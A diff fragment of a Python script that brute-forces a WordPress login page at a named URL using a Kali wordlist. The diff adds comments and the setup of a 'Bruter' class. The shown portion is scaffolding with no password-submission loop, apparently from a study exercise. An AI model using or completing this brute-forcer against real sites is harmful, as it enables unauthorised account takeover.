@@ -25,7 +25,8 @@ import time
 import requests
 import threading
 
-SUCCES = 'Welcome to WordPress!'
+SUCCES = 'Welcome to WordPress!' 
+# String to check for after brute force attempt to determine if it succeeded
 TARGET = 'http://boodelyboo.com/wordpress/wp-login.php'
 WORDLIST = 'home/kali/cain-and-abel'
 
@@ -40,7 +41,7 @@ def get_words():
     return words
         
 def get_params(content):
-    params = dict()
+    params = dict() # dictionary of params to fill out
     parser = etree.HTMLParser()
     tree = etree.parse(BytesIO(content), parser=parser)
     
@@ -51,7 +52,14 @@ def get_params(content):
     
     return params
 
-
+class Bruter:
+    def __init__(self, username, url):
+        self.username = username
+        self.url = url
+        self.found = False
+        print(f'Brute force attack beginning on {url}.\n')
+        print('Finished the setup where username = %s\n' % username)
+    
 
 
 
